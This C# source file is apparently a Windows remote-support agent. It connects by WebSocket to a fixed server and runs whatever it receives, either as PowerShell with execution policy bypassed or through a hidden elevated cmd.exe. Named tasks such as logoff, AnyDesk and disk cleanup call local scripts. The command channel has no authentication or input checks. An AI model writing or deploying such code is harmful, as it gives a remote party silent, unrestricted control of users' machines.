using System;
using System.Collections.Generic;
using System.Net.WebSockets;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using Newtonsoft.Json;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.ServiceProcess;

namespace WindowsSocketClient
{
    class Websocket
    {
        private readonly static UTF8Encoding encoding = new UTF8Encoding();

        public void Start()
        {
            ThreadStart myThreadDelegate = new ThreadStart(StartService);
            Thread myThread = new Thread(myThreadDelegate);
            myThread.Start();
        }

        public void Stop()
        {
            Console.WriteLine("Connection Closed");
        }

        private void StartService()
        {
            Connect().Wait();
        }

        public static async Task Connect()
        {
            Thread.Sleep(1000);
            ClientWebSocket webSocket = null;
            try
            {
                webSocket = new ClientWebSocket();
                await webSocket.ConnectAsync(new Uri("wss://asset.certiplate.com/systems/connect/DESKTOP-RD5H5MF/"), CancellationToken.None);
                await Task.WhenAll(Receive(webSocket), Send(webSocket));
            }
            catch (Exception ex)
            {
                Connect().Wait();
            }
            finally
            {
                if (webSocket != null)
                webSocket.Dispose();
                Console.WriteLine();
                Console.WriteLine("WebSocket closed.");
            }
        }

        private static void Reply(ClientWebSocket webSocket, string s)
        {
            byte[] buffer = encoding.GetBytes(s);
            webSocket.SendAsync(new ArraySegment<byte>(buffer), WebSocketMessageType.Text, true, CancellationToken.None);
            Console.WriteLine("Sent: " + s);
        }

        private static async Task Send(ClientWebSocket webSocket)
        {

            while (webSocket.State == WebSocketState.Open)
            {
                string stringtoSend = "Just to get it connected+hello+hello+hello";
                byte[] buffer = encoding.GetBytes(stringtoSend);
                await webSocket.SendAsync(new ArraySegment<byte>(buffer), WebSocketMessageType.Text, true, CancellationToken.None);
                Console.WriteLine("Sent: " + stringtoSend);
                await Task.Delay(10000);
            }
        }

        private static async Task Receive(ClientWebSocket webSocket)
        {
            while (webSocket.State == WebSocketState.Open)
            {
                byte[] buffer = new byte[1024];
                var result = await webSocket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                if (result.MessageType == WebSocketMessageType.Close)
                {
                    await webSocket.CloseAsync(WebSocketCloseStatus.NormalClosure, string.Empty, CancellationToken.None);
                }
                else
                {
                    string s = Encoding.UTF8.GetString(buffer).TrimEnd('\0');
                    Console.Write(s);
                    string[] values = s.Split('+');
                    if (values[2].Trim() == "windows")
                    {
                        if (values[3].Trim() == "powershell")
                        {
                            /*if(values[1].Trim() == "update")
                            {
                                using (var ps = PowerShell.Create())
                                {
                                    ps.AddCommand("Set-ExecutionPolicy").AddParameter("Scope", "Process").AddParameter("ExecutionPolicy", "Bypass").Invoke();
                                    Collection<PSObject> results = ps.AddScript("C:\\Temp\\Get-Windows-Update.ps1").Invoke();
                                    StringBuilder stringBuilder = new StringBuilder();
                                    foreach (PSObject obj in results)
                                    {
                                        stringBuilder.AppendLine(obj.ToString());
                                        Console.WriteLine(obj.ToString());
                                    }
                                    foreach (var error in ps.Streams.Error)
                                    {
                                        stringBuilder.AppendLine("ERROR: " + error.ToString());
                                        Console.WriteLine(error.ToString());
                                    }
                                    string stringtoSent = stringBuilder.ToString() + " Done+browser+hello+hello";
                                    Reply(webSocket, stringtoSent);
                                }
                            }
                            else if(values[1].Trim() == "update_antivirus")
                            {
                                using (var ps = PowerShell.Create())
                                {
                                    ps.AddCommand("Set-ExecutionPolicy").AddParameter("Scope", "Process").AddParameter("ExecutionPolicy", "Bypass").Invoke();
                                    var results = ps.AddScript("C:\\Temp\\Update-Antivirus.ps1").Invoke();
                                    StringBuilder stringBuilder = new StringBuilder();
                                    foreach (var obj in results)
                                    {
                                        stringBuilder.AppendLine(obj.ToString());
                                    }
                                    foreach (var error in ps.Streams.Error)
                                    {
                                        stringBuilder.AppendLine("ERROR: " + error.ToString());
                                    }
                                    string stringtoSent = stringBuilder.ToString() + " Done+browser+hello+hello";
                                    Reply(webSocket, stringtoSent);
                                }
                            }*/
                            if (values[1].Trim() == "logoff")
                            {
                                using (var ps = PowerShell.Create())
                                {
                                    ps.AddCommand("Set-ExecutionPolicy").AddParameter("Scope", "Process").AddParameter("ExecutionPolicy", "Bypass").Invoke();
                                    var results = ps.AddScript("C:\\Temp\\logoff.ps1").Invoke();
                                    StringBuilder stringBuilder = new StringBuilder();
                                    foreach (var obj in results)
                                    {
                                        stringBuilder.AppendLine(obj.ToString());
                                    }
                                    /*foreach (var error in ps.Streams.Error)
                                    {
                                        stringBuilder.AppendLine("ERROR: " + error.ToString());
                                    }*/
                                    string stringtoSent = stringBuilder.ToString() + " Done+browser+hello+hello";
                                    Reply(webSocket, stringtoSent);
                                }
                            }
                            else if (values[1].Trim() == "anydesk")
                            {
                                using (var ps = PowerShell.Create())
                                {
                                    ps.AddCommand("Set-ExecutionPolicy").AddParameter("Scope", "Process").AddParameter("ExecutionPolicy", "Bypass").Invoke();
                                    var results = ps.AddScript("C:\\Temp\\anydesk.ps1").Invoke();
                                    StringBuilder stringBuilder = new StringBuilder();
                                    foreach (var obj in results)
                                    {
                                        stringBuilder.AppendLine(obj.ToString());
                                    }
                                    /*foreach (var error in ps.Streams.Error)
                                    {
                                        stringBuilder.AppendLine("ERROR: " + error.ToString());
                                    }*/
                                    string stringtoSent = stringBuilder.ToString() + " Done+browser+hello+hello";
                                    Reply(webSocket, stringtoSent);
                                }
                            }
                            else if (values[1].Trim() == "quick_scan")
                            {
                                using (var ps = PowerShell.Create())
                                {
                                    ps.AddCommand("Set-ExecutionPolicy").AddParameter("Scope", "Process").AddParameter("ExecutionPolicy", "Bypass").Invoke();
                                    var results = ps.AddScript("C:\\Temp\\scan.ps1").Invoke();
                                    StringBuilder stringBuilder = new StringBuilder();
                                    foreach (var obj in results)
                                    {
                                        stringBuilder.AppendLine(obj.ToString());
                                    }
                                    /*foreach (var error in ps.Streams.Error)
                                    {
                                        stringBuilder.AppendLine("ERROR: " + error.ToString());
                                    }*/
                                    string stringtoSent = stringBuilder.ToString() + " Done+browser+hello+hello";
                                    Reply(webSocket, stringtoSent);
                                }
                            }
                            else if (values[1].Trim() == "delete_temp_files")
                            {
                                using (var ps = PowerShell.Create())
                                {
                                    ps.AddCommand("Set-ExecutionPolicy").AddParameter("Scope", "Process").AddParameter("ExecutionPolicy", "Bypass").Invoke();
                                    var results = ps.AddScript("C:\\Temp\\temp.ps1").Invoke();
                                    StringBuilder stringBuilder = new StringBuilder();
                                    foreach (var obj in results)
                                    {
                                        stringBuilder.AppendLine(obj.ToString());
                                    }
                                    /*foreach (var error in ps.Streams.Error)
                                    {
                                        stringBuilder.AppendLine("ERROR: " + error.ToString());
                                    }*/
                                    string stringtoSent = stringBuilder.ToString() + " Done+browser+hello+hello";
                                    Reply(webSocket, stringtoSent);
                                }
                            }
                            else if (values[1].Trim() == "disk_cleanup")
                            {
                                using (var ps = PowerShell.Create())
                                {
                                    ps.AddCommand("Set-ExecutionPolicy").AddParameter("Scope", "Process").AddParameter("ExecutionPolicy", "Bypass").Invoke();
                                    var results = ps.AddScript("C:\\Temp\\disk_cleanup.ps1").Invoke();
                                    StringBuilder stringBuilder = new StringBuilder();
                                    foreach (var obj in results)
                                    {
                                        stringBuilder.AppendLine(obj.ToString());
                                    }
                                    /*foreach (var error in ps.Streams.Error)
                                    {
                                        stringBuilder.AppendLine("ERROR: " + error.ToString());
                                    }*/
                                    string stringtoSent = stringBuilder.ToString() + " Done+browser+hello+hello";
                                    Reply(webSocket, stringtoSent);
                                }
                            }
                            else if (values[1].Trim() == "update_windows")
                            {
                                using (var ps = PowerShell.Create())
                                {
                                    ps.AddCommand("Set-ExecutionPolicy").AddParameter("Scope", "Process").AddParameter("ExecutionPolicy", "Bypass").Invoke();
                                    var results = ps.AddScript("C:\\Temp\\windows_update.ps1").Invoke();
                                    StringBuilder stringBuilder = new StringBuilder();
                                    foreach (var obj in results)
                                    {
                                        stringBuilder.AppendLine(obj.ToString());
                                    }
                                    /*foreach (var error in ps.Streams.Error)
                                    {
                                        stringBuilder.AppendLine("ERROR: " + error.ToString());
                                    }*/
                                    string stringtoSent = stringBuilder.ToString() + " Done+browser+hello+hello";
                                    Reply(webSocket, stringtoSent);
                                }
                            }
                            else if (values[1].Trim() == "update_windows_antivirus")
                            {
                                using (var ps = PowerShell.Create())
                                {
                                    ps.AddCommand("Set-ExecutionPolicy").AddParameter("Scope", "Process").AddParameter("ExecutionPolicy", "Bypass").Invoke();
                                    var results = ps.AddScript("C:\\Temp\\update_antivirus.ps1").Invoke();
                                    StringBuilder stringBuilder = new StringBuilder();
                                    foreach (var obj in results)
                                    {
                                        stringBuilder.AppendLine(obj.ToString());
                                    }
                                    /*foreach (var error in ps.Streams.Error)
                                    {
                                        stringBuilder.AppendLine("ERROR: " + error.ToString());
                                    }*/
                                    string stringtoSent = stringBuilder.ToString() + " Done+browser+hello+hello";
                                    Reply(webSocket, stringtoSent);
                                }
                            }
                            else
                            {
                                try
                                {
                                    Runspace runspace = RunspaceFactory.CreateRunspace();
                                    runspace.Open();
                                    Pipeline pipeline = runspace.CreatePipeline();
                                    pipeline.Commands.AddScript("Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass");
                                    pipeline.Commands.AddScript(values[0].Trim() + " #Requires -RunAsAdministrator");
                                    pipeline.Commands.Add("Out-String");
                                    pipeline.Invoke();
                                    runspace.Close();
                                    string stringtoSent = "Done+browser+hello+hello";
                                    Reply(webSocket, stringtoSent);
                                }
                                catch (Exception ex)
                                {
                                    string stringtoSent = ex + "+browser+hello+hello";
                                    Reply(webSocket, stringtoSent);
                                }
                            }
                        }
                        else
                        {
                            Process process = new Process();
                            process.StartInfo.FileName = "cmd.exe";
                            process.StartInfo.Verb = "runas";
                            process.StartInfo.CreateNoWindow = true;
                            process.StartInfo.RedirectStandardInput = true;
                            process.StartInfo.RedirectStandardOutput = false;
                            process.StartInfo.UseShellExecute = false;

                            process.Start();
                            process.StandardInput.WriteLine(values[0].Trim());
                            process.StandardInput.Flush();
                            process.StandardInput.Close();
                            process.WaitForExit();
                            string stringtoSent = "Done+browser+hello+hello";
                            Reply(webSocket, stringtoSent);
                        }
                    }
                }
            }
        }
    }
}